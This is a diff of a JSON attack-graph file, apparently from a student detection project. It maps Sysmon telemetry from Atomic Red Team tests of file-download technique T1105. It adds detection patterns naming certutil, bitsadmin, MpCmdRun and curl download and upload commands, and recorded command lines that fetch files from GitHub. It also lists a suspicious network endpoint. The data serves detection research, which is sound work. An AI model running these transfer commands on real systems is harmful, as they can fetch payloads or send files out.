@@ -2,7 +2,7 @@
   "schema_version": 1,
   "kind": "pure_attack_tree",
   "technique": "T1105",
-  "generated_at_utc": "2026-05-05T17:06:33.305497+00:00",
+  "generated_at_utc": "2026-05-06T14:37:39.778089+00:00",
   "source_file": "D:\\Capstone Project & NCKH\\attack_data\\datasets\\attack_techniques\\T1105\\atomic_red_team\\curl-linux-sysmon.log",
   "source_files": [
     "D:\\Capstone Project & NCKH\\attack_data\\datasets\\attack_techniques\\T1105\\atomic_red_team\\curl-linux-sysmon.log",
@@ -12,16 +12,945 @@
     "D:\\Capstone Project & NCKH\\attack_data\\datasets\\attack_techniques\\T1105\\atomic_red_team\\windows-sysmon_curl_upload.log"
   ],
   "patterns": {
-    "malicious": [],
-    "whitelist": [],
+    "malicious": [
+      "certutil  -urlcache -split -f",
+      "certutil",
+      "bitsadmin.exe",
+      "bitsadmin.exe  \\transfer",
+      "mpcmdrun.exe  -downloadfile -url",
+      "%system32%\\curl.exe  -k https:\\github.com\\redcanaryco\\atomic-red-team",
+      "curl.exe  -d c:\\temp\\atomictestfile.txt",
+      "curl.exe  --upload-file c:\\temp\\atomictestfile.txt",
+      "wget --timeout 60",
+      "curl -so",
+      "curl"
+    ],
+    "whitelist": [
+      "multi_file",
+      "firefox"
+    ],
     "config_path": "D:\\Capstone Project & NCKH\\Multisource Attack Graph\\inspect_log_gui\\data\\T1105_malcious_config.json"
   },
   "matching": {
-    "malicious_node_ids": [],
-    "whitelist_node_ids": [],
-    "overlap_whitelist_override_node_ids": []
+    "malicious_node_ids": [
+      "File:0165b9905b4a34eb987f8aeb6126ed5a2f9d28d6bde7549223e7de947e645a75:7",
+      "File:06f632cae2bed7616797c0603a9502bf7f67eb41b717e221d150252f09a0178a:7",
+      "File:1243375dbdd9510e3f2a74b8f10f7e82b5108f549e5537481acc53b7b22a1371:7",
+      "File:139f7a6ced96b702818ddfea2736ef671008fda2b4d1c63e1f6f5aecaa23d8e6:7",
+      "File:160eab8f24686d769c9bfa8cadb5e632c358366e7ec2eaf3373a2ef4d731629e:7",
+      "File:19472e477d247f4145673e38acf57b83f708b61266308dea6f4e2b3b47b7ce59:7",
+      "File:1e1142cef1f05bc99765a570ef2232528c20dc9492224f4ce842010205a0cb7e:7",
+      "File:2ffcceaca489b62f08144fe6ae8d9c9875b00895f39dd257b36fb40d6eb80988:11",
+      "File:428506138d0bf77848c28449fcb8ba88ffe60393e5bbee010b60571c30004e86:7",
+      "File:4d40a8b621a06f30abe4a4ecfd9129953992a18dfb481163b1bf9d434ee521dc:7",
+      "File:5b462892012eff059a85498f6863d643217009c3f9e07f35e71e72b9134c1869:7",
+      "File:6741bbd10169c53837e451e1512a25d8d4d4073c784ea7b4c5112a3a4cecbd9e:7",
+      "File:68b3c8f8ab782e0642adc09bae2bacadb161b2fba9ead93f7569fc8ff03f0676:7",
+      "File:6e23e41705c933904a855fb517b24075468eb5d22501ebc71d4ecbdedbdbd19a:7",
+      "File:7231190315d39551649f4f9da449a9e30e1a887595cd95a5847553e5927c9596:7",
+      "File:7fb66dd0e5d2c34be98c06a87e5227258fe8f1b20f8186a695cf39e707f77c28:7",
+      "File:800e466bba30b6e86d963cc81c687688dca4fd6aa7eb181e5c5271f4acc665b4:7",
+      "File:85b4704cb6b28a1cf25850582ece871fe948f8d1677ff5b8836dbe7bb2f3e180:7",
+      "File:884b181573300ba4a65b5ae721a3450db12c6c2d4fab187a3bc6e28ff8311ed9:7",
+      "File:9645a0699b090a2c814057f9add85dd0473c7d36ac237d47ac9d286dc2555430:7",
+      "File:9e3ffa11adf2daa2ca57aadcea100f1eced847277249401b7938105776b18088:7",
+      "File:a9f673787ab340d6ef4d056f268e369ad01971bdadee80a29ef5c155e82e3ff8:7",
+      "File:b2a83787692d9f5ec141753f101524764ea3b8ed60a1bd0cd2417cd93829fff8:7",
+      "File:b60d30145077a0dc36fa59c19b14d53a86694490ed265c7f928ded3122ef373a:7",
+      "File:be454fd51b4ebeb50829a5a107ca89c5af79aeb5c5d1d2cd40547498f95233fb:7",
+      "File:c5943c7cede5876ed03f38261c4ec12c11a4f669afdb57b85314c1b5a48f8cd6:7",
+      "File:ca605d973177f52dcd79632b11bdc368190d6c4f16d8f0ef7e6c8ed0829b4c5d:7",
+      "File:d000c4545f131a56947708a4d526e884a9bd6578c0ec2d735e4e4e23749c6df2:7",
+      "File:d3ed69ac19b73b46deb7f9d6ae08b1cabe9c64d0534e1ed3cc8be6b7c4dd6bb8:23",
+      "File:e6beef42f39141f35cc0aaed3becfbe793c4d8f0010f55f892372773cbd29923:11",
+      "File:eaf2da9d52e781ed01fb925d0408d3c284d0876a7df0e9685f75a2df715f33a2:7",
+      "File:f5265318b5f1148ffbbe24ca0307cef02f129ded08cbc18fb05497489ec1f5b5:7",
+      "File:f554777f756da45f3b15702376fb6163958555c5ce906ee07473cc27c12d441f:7",
+      "File:f67d11806e3b95bd0953ef936a840020c632d0324630c76d0b163d5cf7b59a48:23",
+      "File:fc0ef9da2f5aafc20ee58a746df609b9abda1acfe9ff986ef9da07354d16cd30:7",
+      "Process:{38b9f94a-e3cf-6754-8b80-000000002f03}:1",
+      "Process:{896A638B-B3E2-605B-6969-00000000AE01}:1",
+      "Process:{896A638B-B3E2-605B-6A69-00000000AE01}:1",
+      "Process:{896A638B-B3E2-605B-6B69-00000000AE01}:1",
+      "Process:{896A638B-B3E2-605B-6B69-00000000AE01}:10",
+      "Process:{896A638B-B3E4-605B-6D69-00000000AE01}:10",
+      "Process:{896A638B-B3E4-605B-6E69-00000000AE01}:1",
+      "Process:{896A638B-B3E4-605B-6F69-00000000AE01}:1",
+      "Process:{896A638B-B3E4-605B-6F69-00000000AE01}:10",
+      "Process:{896A638B-B3E7-605B-7669-00000000AE01}:1",
+      "Process:{896A638B-B3F6-605B-7869-00000000AE01}:1",
+      "Process:{896A638B-B3F6-605B-7869-00000000AE01}:10",
+      "Process:{896A638B-B3FA-605B-7A69-00000000AE01}:1",
+      "Process:{896A638B-B3FA-605B-7A69-00000000AE01}:10",
+      "Process:{896A638B-B3FF-605B-7F69-00000000AE01}:1",
+      "Process:{896A638B-B3FF-605B-7F69-00000000AE01}:10",
+      "Process:{896A638B-B403-605B-8169-00000000AE01}:1",
+      "Process:{896A638B-B407-605B-8369-00000000AE01}:1",
+      "Process:{896A638B-B41B-605B-8969-00000000AE01}:1",
+      "Process:{896A638B-B422-605B-8B69-00000000AE01}:1",
+      "Process:{896A638B-B42B-605B-8D69-00000000AE01}:1",
+      "Process:{896A638B-B432-605B-8F69-00000000AE01}:1",
+      "Process:{8B6011A9-E4B7-618B-8EA5-04000000F101}:1",
+      "Process:{8B6011A9-E4F2-618B-96A5-04000000F101}:1",
+      "Process:{8B6011A9-E4FA-618B-97A5-04000000F101}:1",
+      "Process:{8B6011A9-E58D-618B-A9A5-04000000F101}:1",
+      "Process:{8B6011A9-E592-618B-AEA5-04000000F101}:1",
+      "Process:{8B6011A9-E59F-618B-AFA5-04000000F101}:1",
+      "Process:{8B6011A9-E695-618B-D0A5-04000000F101}:1",
+      "Process:{8B6011A9-F329-616E-043B-01000000F101}:1",
+      "Process:{8B6011A9-F32A-616E-053B-01000000F101}:1",
+      "Process:{8B6011A9-F32A-616E-063B-01000000F101}:1",
+      "Process:{8B6011A9-F32A-616E-073B-01000000F101}:1",
+      "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "Process:{8B6011A9-F32A-616E-083B-01000000F101}:10",
+      "Process:{ec28c72e-0c88-62e4-78cd-bc06f4550000}:1",
+      "Process:{ec28c72e-0cf7-62e4-78ed-32828d550000}:1",
+      "Process:{ec28c72e-0d00-62e4-784d-26e689550000}:1",
+      "Process:{ec28c72e-0de8-62e4-78dd-fab9d7550000}:1",
+      "Process:{ec28c72e-0e19-62e4-782d-c19dfa550000}:1",
+      "Process:{ec28c72e-0e2a-62e4-78ad-3268be550000}:1",
+      "Process:{ec28c72e-0f16-62e4-78bd-82e05d550000}:1",
+      "Process:{ec28c72e-0f77-62e4-781d-5c1a9a550000}:1",
+      "Process:{ec28c72e-0fdb-62e4-782d-e0fe87550000}:1",
+      "Process:{ec28c72e-cd5e-62e3-785d-93e58d550000}:1",
+      "Process:{ec28c72e-cd5f-62e3-78cd-b3690d560000}:1",
+      "Process:{ec28c72e-d389-62e3-788d-737768550000}:1",
+      "Process:{ec28c72e-d38a-62e3-78ad-379917560000}:1",
+      "Process:{ec28c72e-d396-62e3-782d-b124e8550000}:1",
+      "Process:{ec28c72e-d3ea-62e3-782d-328196550000}:1",
+      "Process:{ec28c72e-ee09-62e3-78dd-38347a550000}:1",
+      "Process:{ec2d99e9-8852-61b3-785d-5260cd550000}:1",
+      "Process:{ec2d99e9-8859-61b3-785d-af70fc550000}:1",
+      "Process:{ec2d99e9-a732-61b4-785d-d223b3550000}:1",
+      "Process:{ec2d99e9-a7d4-61b4-787d-a086d1550000}:1",
+      "Process:{ec2d99e9-ce9c-61b3-ecee-10bc91550000}:1",
+      "Process:{ec2d99e9-ed26-61ae-703c-e40c0c560000}:1",
+      "Registry:91a5257771cc01f0890f539d25d891562f40d420bb2931551ba5793d146f9cd2:12",
+      "network:45.155.205.233:5874:tcp"
+    ],
+    "whitelist_node_ids": [
+      "File:063738ad5432340c4f859014ce8eaa45746d648ee7a63ad24de46af29b83bbad:23",
+      "File:0e568c188e63e5da50d69b8ebdedf647de16e161db00394b8990fcdc6510b381:17",
+      "File:0e568c188e63e5da50d69b8ebdedf647de16e161db00394b8990fcdc6510b381:18",
+      "File:1467ccb27ed0b8a6646856b45aca8cb0a4e5931fa6e934c9fcc45babbdbd6991:23",
+      "File:2270b080bf6774fe390f18fa1aa67fb66cccaa92fc8d1f3ce97bdb8f1cb54666:11",
+      "File:2270b080bf6774fe390f18fa1aa67fb66cccaa92fc8d1f3ce97bdb8f1cb54666:23",
+      "File:25cde46cfd237e962341d6c9a954c9557c67b227e0568ac52de1b872e3f9e664:23",
+      "File:273dd79041132b5ae7444e8c70b3da93c468863e2851234f99a8872e7b909462:17",
+      "File:273dd79041132b5ae7444e8c70b3da93c468863e2851234f99a8872e7b909462:18",
+      "File:2e74bc4cda9f264cc98012a569294c0373ba4b3d9253414b022d767cab057d38:11",
+      "File:2e74bc4cda9f264cc98012a569294c0373ba4b3d9253414b022d767cab057d38:23",
+      "File:2f0ba0c2c4a7f834078b9033c419755ff1c8497e94e6a95b343d23670aada502:17",
+      "File:2f0ba0c2c4a7f834078b9033c419755ff1c8497e94e6a95b343d23670aada502:18",
+      "File:345cc4c9e992852492c67ebe1ea84b386f544987357637e81a68fc6a1dd565eb:23",
+      "File:3d802b7fcbd613b89df85ec4326b5a765fbd2d3629d9ebf3bffca1a956e86295:17",
+      "File:3d802b7fcbd613b89df85ec4326b5a765fbd2d3629d9ebf3bffca1a956e86295:18",
+      "File:3dcf5af31c618ecba724f8519f6b2badbd13a758c859563b0ced7435130f790f:17",
+      "File:3dcf5af31c618ecba724f8519f6b2badbd13a758c859563b0ced7435130f790f:18",
+      "File:3fb3fb1cb3133891fba9d28cd552d25390eeee6c771d3d8b359b44e603aed83a:17",
+      "File:3fb3fb1cb3133891fba9d28cd552d25390eeee6c771d3d8b359b44e603aed83a:18",
+      "File:41470c71a9da333cf2d7254ecbe0b5845aa19aba1e4a57aeb2956a41d68dd88c:17",
+      "File:41470c71a9da333cf2d7254ecbe0b5845aa19aba1e4a57aeb2956a41d68dd88c:18",
+      "File:481d549e338d9432ddb27b15d46910067ea58b69d76e061ac332606564c28edd:23",
+      "File:4906746715f1cafa8a7e14192527987479e305daef465aa76d57bbc4f1fad818:17",
+      "File:4906746715f1cafa8a7e14192527987479e305daef465aa76d57bbc4f1fad818:18",
+      "File:4b836d8094d58964e6e98dccd3fa47572700f2caeece5b06a317abe76afd8416:17",
+      "File:4b836d8094d58964e6e98dccd3fa47572700f2caeece5b06a317abe76afd8416:18",
+      "File:4e1609afb83d69b3b3a47a3f8cd01d181f55a449979cc72226dd8b613638d38d:23",
+      "File:77f8a33e056ca60ae44fceb923dc7096398fdc78f3e5e1139e55b7acd5111e31:23",
+      "File:7bee61ce28bba831021830af90fb8eb5b1b047512d635eadb9922b90c515e01e:17",
+      "File:7bee61ce28bba831021830af90fb8eb5b1b047512d635eadb9922b90c515e01e:18",
+      "File:80aabcfa735684ed58d9c52c1d29fe6a2ded32d359d82cfedaa01046e28ffc44:17",
+      "File:80aabcfa735684ed58d9c52c1d29fe6a2ded32d359d82cfedaa01046e28ffc44:18",
+      "File:89da625e7a3cdf1d03e677d9fbeed2c302cbe49efcb5205490f6eacd3875307f:23",
+      "File:8f80a1fefee81c2a8df67ab3f2bb1d5911e935888160232fef7980ddcfcd24c7:11",
+      "File:8f80a1fefee81c2a8df67ab3f2bb1d5911e935888160232fef7980ddcfcd24c7:23",
+      "File:94d47f6ddf95df86833e6fba2206eb548ac39a64f7672da92f6e3ce916dfa14d:17",
+      "File:94d47f6ddf95df86833e6fba2206eb548ac39a64f7672da92f6e3ce916dfa14d:18",
+      "File:961c50dd2b0a03a00618dba7e2021fbf5eae680ee472fc6b39bf2a3128ed14a2:11",
+      "File:9fa87b12ce18a0a85fd74fd2000a78350e0bd2de6bd1a78141bab32dc5254c78:17",
+      "File:9fa87b12ce18a0a85fd74fd2000a78350e0bd2de6bd1a78141bab32dc5254c78:18",
+      "File:a75ba818cb9cfbf7d2e016e95d1d5bf1839ed338ebf49ba973aebb09fb95b426:17",
+      "File:a75ba818cb9cfbf7d2e016e95d1d5bf1839ed338ebf49ba973aebb09fb95b426:18",
+      "File:bcf3cc9b21808464ced51648949d1067f7db97a85a962feaf74e740b53e30b24:17",
+      "File:bcf3cc9b21808464ced51648949d1067f7db97a85a962feaf74e740b53e30b24:18",
+      "File:bd95d07372fe7446944d408950e19354955221e1646935d824d863be8379ad82:17",
+      "File:bd95d07372fe7446944d408950e19354955221e1646935d824d863be8379ad82:18",
+      "File:c77ee01b0f8eb6c5499f5183a56946af52c96a223cf957954c6555a8987fcc1b:17",
+      "File:c77ee01b0f8eb6c5499f5183a56946af52c96a223cf957954c6555a8987fcc1b:18",
+      "File:cb286581b28c7f8acb447f803da087450326812ffbebea05978cca1e7d641b72:17",
+      "File:cb286581b28c7f8acb447f803da087450326812ffbebea05978cca1e7d641b72:18",
+      "File:cf3a5c9f2ac55eecfc7b868a140742709553dccdd9d943315b408291d8108c2d:17",
+      "File:cf3a5c9f2ac55eecfc7b868a140742709553dccdd9d943315b408291d8108c2d:18",
+      "File:d4def2c95a5be0ceee63dd114072b00c3278315644eddc53f2f5871d0f979710:23",
+      "File:e7e7bdc69da84176ebebf1f0a7d8c67f3bc9eb8778480e39af5ed0ee386daf5c:18",
+      "File:efbcce5d8f7a8e893949b747dbc6175096eefe3315921c31a5d543e47beea9e2:17",
+      "File:efbcce5d8f7a8e893949b747dbc6175096eefe3315921c31a5d543e47beea9e2:18",
+      "File:f4a431cafc070a4fb0f6728ca696b38ce5495f0a02a51d3049cd99974651297a:17",
+      "File:f4a431cafc070a4fb0f6728ca696b38ce5495f0a02a51d3049cd99974651297a:18",
+      "File:f5489c7960ef2c8d1232f7c7ee2d7ba53e1a22b626f0a44aa115ccb41d57834d:17",
+      "File:f5489c7960ef2c8d1232f7c7ee2d7ba53e1a22b626f0a44aa115ccb41d57834d:18",
+      "File:f7d9a3b173fb72e1054e0209e1b88deb9685f9dcccc15205ca52c7458406fce4:23",
+      "File:f89e971fd3f852c5ed3066b752364f1b4d84a178a15b5b9dfd5403d1a1305c87:17",
+      "File:f89e971fd3f852c5ed3066b752364f1b4d84a178a15b5b9dfd5403d1a1305c87:18",
+      "File:fe9048c02ef7246f4284bb16a0b5b3af97630668bcefccf84a3eab94b8f2d44b:17",
+      "File:fe9048c02ef7246f4284bb16a0b5b3af97630668bcefccf84a3eab94b8f2d44b:18",
+      "Process:{896A638B-B434-605B-9169-00000000AE01}:1",
+      "Process:{896A638B-B434-605B-9169-00000000AE01}:10",
+      "Process:{896A638B-B436-605B-9269-00000000AE01}:1",
+      "Process:{896A638B-B436-605B-9269-00000000AE01}:10",
+      "Process:{896A638B-C9AE-6058-4C07-00000000AE01}:1",
+      "Process:{896A638B-C9B1-6058-4E07-00000000AE01}:10",
+      "network:104.18.26.190:443:tcp",
+      "network:104.244.42.133:443:tcp",
+      "network:151.139.237.219:443:tcp",
+      "network:172.217.3.168:443:tcp",
+      "network:172.217.3.170:443:tcp",
+      "network:216.58.193.67:443:tcp",
+      "network:216.58.217.36:443:tcp",
+      "network:34.202.225.38:443:tcp",
+      "network:52.84.162.36:443:tcp",
+      "network:72.21.91.24:443:tcp",
+      "network:99.86.38.54:443:tcp",
+      "network:99.86.38.55:443:tcp"
+    ],
+    "overlap_whitelist_override_node_ids": [
+      "File:2e74bc4cda9f264cc98012a569294c0373ba4b3d9253414b022d767cab057d38:11",
+      "File:2e74bc4cda9f264cc98012a569294c0373ba4b3d9253414b022d767cab057d38:23",
+      "File:961c50dd2b0a03a00618dba7e2021fbf5eae680ee472fc6b39bf2a3128ed14a2:11",
+      "File:d4def2c95a5be0ceee63dd114072b00c3278315644eddc53f2f5871d0f979710:23",
+      "File:f7d9a3b173fb72e1054e0209e1b88deb9685f9dcccc15205ca52c7458406fce4:23"
+    ]
   },
   "nodes": [
+    {
+      "id": "File:9e3ffa11adf2daa2ca57aadcea100f1eced847277249401b7938105776b18088:7",
+      "label": "gdi32.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\gdi32.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=551D603CEC947F586DB9FADEF4D2EBA6,SHA256=143125EFF9F3BC5B3F3BE505F3C3814393807B9CACB6AA5F75D39C77EC0D4ED8",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:9e3ffa11adf2daa2ca57aadcea100f1eced847277249401b7938105776b18088:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "gdi32.dll",
+        "name": "gdi32.dll"
+      }
+    },
+    {
+      "id": "File:be454fd51b4ebeb50829a5a107ca89c5af79aeb5c5d1d2cd40547498f95233fb:7",
+      "label": "cryptbase.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\cryptbase.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=51FCB0FDEFCB9A3E4A1DC8C8673BC63C,SHA256=63A0E1A76B7ABCF56E44B548568649FFB6B5609402746D48A4DC77CCED20F5FE",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:be454fd51b4ebeb50829a5a107ca89c5af79aeb5c5d1d2cd40547498f95233fb:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "cryptbase.dll",
+        "name": "cryptbase.dll"
+      }
+    },
+    {
+      "id": "Process:{896A638B-B3E2-605B-6B69-00000000AE01}:1",
+      "label": "certutil.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "certutil.exe",
+        "guid": "{896A638B-B3E2-605B-6B69-00000000AE01}",
+        "pid": "2208",
+        "image_path": "%system32%\\certutil.exe",
+        "command_line": "certutil  -urlcache -split -f https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\license.txt atomic-license.txt",
+        "original_file_name": "certutil.exe",
+        "image_hash": "MD5=BF7CEA72AE186A10239F830F93492A73,SHA256=A50DFE408565C2BB011D013AC43E616B2A595B1D06EB9B083F519672732498DA,IMPHASH=442218E88D4D6AA0BE3165DD7B20A4C4",
+        "command_hash": "11546aede332f41f4c9cd6f213e032526c3ef4d325e6ae14687b708dee2c115e",
+        "event_id": "1",
+        "id": "Process:{896A638B-B3E2-605B-6B69-00000000AE01}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "certutil.exe",
+        "name": "certutil.exe",
+        "parent_process_id": "Process:{896A638B-B3E2-605B-6A69-00000000AE01}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{ec28c72e-cd5f-62e3-78cd-b3690d560000}:1",
+      "label": "-",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "-",
+        "guid": "{ec28c72e-cd5f-62e3-78cd-b3690d560000}",
+        "pid": "22871",
+        "image_path": "usr\\bin\\curl",
+        "command_line": "curl --preproxy socks5:\\proxy.example -x http:\\http.example https:\\example.com",
+        "original_file_name": "-",
+        "image_hash": "-",
+        "command_hash": "10f953f8cd150af7dc725117678c37b1d915b105d2f3af835b4a42f4eb06104f",
+        "parent_process_id": "Process:{ec28c72e-caa1-62e3-48c4-b8cb06560000}:1",
+        "user_id": "user:\\ubuntu",
+        "event_id": "1",
+        "id": "Process:{ec28c72e-cd5f-62e3-78cd-b3690d560000}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "-",
+        "name": "-"
+      }
+    },
+    {
+      "id": "Process:{ec2d99e9-ed25-61ae-6812-b38ae4550000}:1",
+      "label": "dash",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{ec2d99e9-ed25-61ae-6812-b38ae4550000}",
+        "pid": "19589",
+        "image_path": "bin\\dash",
+        "command_line": "bin\\sh",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{ec2d99e9-ed25-61ae-6812-b38ae4550000}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "dash",
+        "name": "dash"
+      }
+    },
+    {
+      "id": "File:f67d11806e3b95bd0953ef936a840020c632d0324630c76d0b163d5cf7b59a48:23",
+      "label": "2d2a313164ae3a724cc53b0c8e104dd6053f8402.key",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%temp%\\2\\2d2a313164ae3a724cc53b0c8e104dd6053f8402.key",
+        "source_image_path": "%system32%\\certutil.exe",
+        "content_hash": "MD5=DDA4F30CDD84D94A82586B61071F6AE3,SHA256=65AF6027045D23175366EAB50E460AB3EE7790E591CB84CC32C78AC63A4C90E1,IMPHASH=00000000000000000000000000000000",
+        "parent_process_id": "Process:{896A638B-B3E2-605B-6B69-00000000AE01}:1",
+        "event_id": "23",
+        "id": "File:f67d11806e3b95bd0953ef936a840020c632d0324630c76d0b163d5cf7b59a48:23",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "2d2a313164ae3a724cc53b0c8e104dd6053f8402.key",
+        "name": "2d2a313164ae3a724cc53b0c8e104dd6053f8402.key"
+      }
+    },
+    {
+      "id": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+      "label": "bash",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{ec28c72e-edb1-62e3-4884-14ef6f550000}",
+        "pid": "23094",
+        "image_path": "bin\\bash",
+        "command_line": "bash",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "bash",
+        "name": "bash"
+      }
+    },
+    {
+      "id": "Process:{ec2d99e9-ed26-61ae-703c-e40c0c560000}:1",
+      "label": "-",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "-",
+        "guid": "{ec2d99e9-ed26-61ae-703c-e40c0c560000}",
+        "pid": "19626",
+        "image_path": "usr\\bin\\wget",
+        "command_line": "wget --timeout 60 -u wget\\1.19.4-1ubuntu2.2 ubuntu\\18.04.6\\lts gnu\\linux\\5.4.0-1060-aws\\x86_64 intel(r)\\xeon(r)\\platinum\\8175m\\cpu\\@\\2.50ghz cloud_id\\aws -o- --content-on-error https:\\motd.ubuntu.com",
+        "original_file_name": "-",
+        "image_hash": "-",
+        "command_hash": "159dcc5472c2b692b918da9b01260541487d788bdeff6308c24f5512e9db75ad",
+        "parent_process_id": "Process:{ec2d99e9-ed25-61ae-6812-b38ae4550000}:1",
+        "user_id": "user:\\root",
+        "event_id": "1",
+        "id": "Process:{ec2d99e9-ed26-61ae-703c-e40c0c560000}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "-",
+        "name": "-"
+      }
+    },
+    {
+      "id": "Process:{896A638B-B3E4-605B-6F69-00000000AE01}:1",
+      "label": "bits administration utility",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "bits administration utility",
+        "guid": "{896A638B-B3E4-605B-6F69-00000000AE01}",
+        "pid": "932",
+        "image_path": "%system32%\\bitsadmin.exe",
+        "command_line": "%system32%\\bitsadmin.exe  \\transfer qcxjb7 \\priority high https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\license.txt %temp%\\2\\atomic-license.txt <bitsadmin_transfer>",
+        "original_file_name": "bitsadmin.exe",
+        "image_hash": "MD5=F548717B821860C2B2242367732FE105,SHA256=E1057A20945BCE8F00C0BE5E3DB40C4A98AB33F42F4D2DF919AEDB0EF6651D6E,IMPHASH=CE0EB5030AA7D3C8606F11BBCA0BC912",
+        "command_hash": "d6db3c989582f27e2947532c629796cfeafe791a2026bb9dab9aebccdda06f0e",
+        "parent_process_id": "Process:{896A638B-B3E4-605B-6E69-00000000AE01}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{896A638B-B3E4-605B-6F69-00000000AE01}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "bits administration utility",
+        "name": "bits administration utility"
+      }
+    },
+    {
+      "id": "File:ca605d973177f52dcd79632b11bdc368190d6c4f16d8f0ef7e6c8ed0829b4c5d:7",
+      "label": "fwpuclnt.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\fwpuclnt.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=A65FA613342B08E0F760D8B13B9C135A,SHA256=C64A1EC862188D2EE1202DB02BFBF4E2DD56780905E509012799EB57FC9A88ED",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:ca605d973177f52dcd79632b11bdc368190d6c4f16d8f0ef7e6c8ed0829b4c5d:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "fwpuclnt.dll",
+        "name": "fwpuclnt.dll"
+      }
+    },
+    {
+      "id": "Process:{896A638B-B432-605B-8F69-00000000AE01}:1",
+      "label": "certutil.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "certutil.exe",
+        "guid": "{896A638B-B432-605B-8F69-00000000AE01}",
+        "pid": "7868",
+        "image_path": "%system32%\\certutil.exe",
+        "command_line": "%system32%\\certutil.exe\" \\urlcache -split -f https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\license.txt c:\\temp\\foo.txt",
+        "original_file_name": "certutil.exe",
+        "image_hash": "MD5=BF7CEA72AE186A10239F830F93492A73,SHA256=A50DFE408565C2BB011D013AC43E616B2A595B1D06EB9B083F519672732498DA,IMPHASH=442218E88D4D6AA0BE3165DD7B20A4C4",
+        "command_hash": "df79043875bfc3e829b21523757fc9e0985eef7242aa37f9aba011f2116e0321",
+        "parent_process_id": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{896A638B-B432-605B-8F69-00000000AE01}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "certutil.exe",
+        "name": "certutil.exe"
+      }
+    },
+    {
+      "id": "Process:{896A638B-B3E2-605B-6B69-00000000AE01}:10",
+      "label": "certutil.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "certutil.exe",
+        "guid": "{896A638B-B3E2-605B-6B69-00000000AE01}",
+        "pid": "2208",
+        "image_path": "%system32%\\certutil.exe",
+        "command_line": "GrantedAccess with bitmask: 0x1478 for certutil.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "f12e2703fb48c259b3a3869322b3f1c1572294fa516f6c83bd56302e4cd40de3",
+        "parent_process_id": "Process:{896A638B-B5C8-6058-0B00-00000000AE01}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "10",
+        "id": "Process:{896A638B-B3E2-605B-6B69-00000000AE01}:10",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "certutil.exe",
+        "name": "certutil.exe"
+      }
+    },
+    {
+      "id": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+      "label": "wmiprvse.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{896A638B-B3F6-605B-7769-00000000AE01}",
+        "pid": "5196",
+        "image_path": "%system32%\\wbem\\wmiprvse.exe",
+        "command_line": "%system32%\\wbem\\wmiprvse.exe -secured -embedding",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "wmiprvse.exe",
+        "name": "wmiprvse.exe"
+      }
+    },
+    {
+      "id": "network:45.155.205.233:5874:tcp",
+      "label": "45.155.205.233",
+      "type": "network",
+      "group": "Network",
+      "properties": {
+        "destination_ip": "45.155.205.233",
+        "destination_port": "5874",
+        "protocol": "tcp",
+        "domain_name": "-",
+        "source_image_path": "usr\\bin\\curl",
